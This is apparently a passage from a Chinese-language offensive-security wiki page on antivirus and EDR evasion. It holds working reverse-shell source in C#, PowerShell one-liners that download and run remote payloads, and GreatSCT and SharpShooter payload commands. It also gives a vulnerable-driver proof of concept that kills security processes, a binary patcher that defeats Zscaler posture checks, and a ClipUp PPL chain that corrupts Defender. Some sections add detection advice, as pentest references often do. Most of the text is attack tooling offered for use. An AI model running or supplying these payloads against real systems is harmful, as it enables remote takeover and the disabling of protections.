- 如果同一目录下没有 `UltraVNC.ini` 则不要启动 `winvnc`，否则会导致 [the config window](https://i.imgur.com/rfMQWcf.png) 弹出
- 不要运行 `winvnc -h` 获取帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从这里下载: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **start the lister**，并用下面的命令 **execute** the **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前防护程序会很快终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与之一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终止 AV/EDR

Storm-2603 利用了一个名为 **Antivirus Terminator** 的小型控制台工具，在投放勒索软件之前禁用端点防护。该工具携带了它**自带的易受攻击但已*签名*的驱动程序**，并滥用它来发出特权内核操作，即使是 Protected-Process-Light (PPL) 的 AV 服务也无法阻止。

Key take-aways
1. **Signed driver**: 投放到磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是 Antiy Labs “System In-Depth Analysis Toolkit” 中合法签名的驱动 `AToolsKrnl64.sys`。因为该驱动带有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为 **kernel service**，第二行启动它，从而使 `\\.\ServiceMouse` 可从用户态访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除服务 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD 完全绕过了用户态保护；在内核中执行的代码可以打开 *protected* 进程、终止它们，或篡改内核对象，而不受 PPL/PP、ELAM 或其他加固特性的限制。

Detection / Mitigation
•  启用 Microsoft 的易受攻击驱动阻止列表（`HVCI`、`Smart App Control`），以便 Windows 拒绝加载 `AToolsKrnl64.sys`。  
•  监视新的 *kernel* 服务创建，并在驱动从可被全局写入的目录加载或不在允许列表中时发出告警。  
•  监控是否存在对自定义设备对象的用户态句柄，随后出现可疑的 `DeviceIoControl` 调用。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** 在本地应用设备姿态规则，并依赖 Windows RPC 将结果传达给其他组件。两个设计缺陷使得完全绕过成为可能：

1. 姿态评估**完全在客户端**进行（仅向服务器发送一个布尔值）。  
2. 内部 RPC 端点只验证连接的可执行文件是否由 **Zscaler 签名**（通过 `WinVerifyTrust`）。

通过在磁盘上对四个已签名二进制进行**补丁**，这两种机制都可以被中和：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，使每次检查通过 |
| `ZSAService.exe` | 间接调用到 `WinVerifyTrust` | 被 NOP 处理 ⇒ 任何（甚至未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对隧道的完整性检查 | 被短路 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
在替换原始文件并重启服务堆栈后：

* **所有** 态势检查显示为 **绿色/合规**。
* 未签名或被修改的二进制可以打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 已被妥协的主机将获得由 Zscaler 策略定义的内部网络的不受限制访问。

本案例展示了如何通过少量字节修补，击败纯客户端的信任决策和简单的签名校验。

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) 强制执行签名者/级别层级，只有相同或更高的受保护进程才能相互篡改。进攻上，如果你能够合法地启动一个启用了 PPL 的二进制并控制其参数，你可以将良性功能（例如日志记录）转换为针对 AV/EDR 使用的受保护目录的受限、由 PPL 支持的写原语。

What makes a process run as PPL
- 目标 EXE（以及任何加载的 DLLs）必须使用具备 PPL 能力的 EKU 签名。
- 进程必须使用 CreateProcess 创建，并使用标志：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制签名者匹配的兼容保护级别（例如，对 anti-malware 签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，对 Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的级别将在创建时失败。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 已签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自我产生子进程，并接受一个参数，将日志文件写入调用者指定的路径。
- 当以 PPL 进程启动时，文件写入会带有 PPL 支持。
- ClipUp 无法解析包含空格的路径；使用 8.3 短路径指向通常受保护的位置。

8.3 short path helpers
- 列出短名：在每个父目录中运行 `dir /x`。
- 在 cmd 中派生短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用启动器（例如 CreateProcessAsPPL），通过 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 的日志路径参数，强制在受保护的 AV 目录中创建文件（例如 Defender Platform）。如有必要，使用 8.3 短名称。
3) 如果目标二进制文件在运行时通常被 AV 打开/锁定（例如 MsMpEng.exe），则通过安装一个能够更早可靠运行的自启动服务，在 AV 启动之前安排在引导时写入。使用 Process Monitor（boot logging）验证引导顺序。
4) 重启后，带有 PPL 支持的写入会在 AV 锁定其二进制文件之前发生，导致目标文件损坏并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意与限制
- 除了放置位置外，无法控制 ClipUp 写入的内容；该 primitive 更适合用于破坏而非精确的内容注入。
- 需要本地 admin/SYSTEM 权限来安装/启动服务并需要重启窗口。
- 时间控制很关键：目标不得被打开；在引导时执行可避免文件锁定。

检测
- 在引导期间，注意使用异常参数创建 `ClipUp.exe` 的进程，尤其是由非标准启动器作为父进程时。
- 新服务被配置为自动启动可疑二进制并持续在 Defender/AV 之前启动。调查在 Defender 启动失败之前的服务创建/修改。
- 对 Defender 二进制/Platform 目录进行文件完整性监控；注意带有 protected-process 标志的进程异常创建/修改文件。
- ETW/EDR 遥测：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非-AV 二进制异常使用 PPL 等级的情况。

缓解措施
- WDAC/Code Integrity：限制哪些签名二进制可以以 PPL 运行以及允许的父进程；阻止 ClipUp 在非合法上下文中被调用。
- Service hygiene：限制对自动启动服务的创建/修改，并监控启动顺序的篡改。
- 确保 Defender tamper protection 和 early-launch protections 已启用；调查指示二进制被损坏的启动错误。
- 如果与你的环境兼容（请充分测试），考虑在托管安全工具的卷上禁用 8.3 short-name generation。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
